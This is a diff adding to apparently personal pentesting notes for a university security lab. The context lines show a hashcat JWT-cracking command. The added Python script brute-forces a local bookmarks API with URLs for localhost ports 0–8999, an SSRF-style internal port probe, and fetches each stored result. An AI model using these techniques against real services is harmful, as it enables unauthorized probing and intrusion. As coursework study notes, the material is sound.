@@ -21,3 +21,23 @@ hashcat -a 0 -m 16500 <Token> <Wordlist>
 
 # JWT
 https://workbook.securityboat.net/Pentesting/Web%20Application/jwt-and-its-bypass/  
+
+# Brute Force API IDs
+```python
+#!/usr/bin/env python3
+
+import requests
+import json
+import re
+
+for i in range(0,9000):
+
+    r = requests.post('http://localhost:8080/bookmarks', json={'url': f'http://localhost:{i}'}, headers={'GATECH_ID': '904160213'})
+    id = re.search(r"[a-zA-Z0-9]{8}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{12}", r.content.decode())
+
+    search_id = id.group(0)
+
+    r2 = requests.get(f'http://localhost:8080/bookmarks/{search_id}', headers={'GATECH_ID': '904160213'})
+
+    print(r2.content)
+```
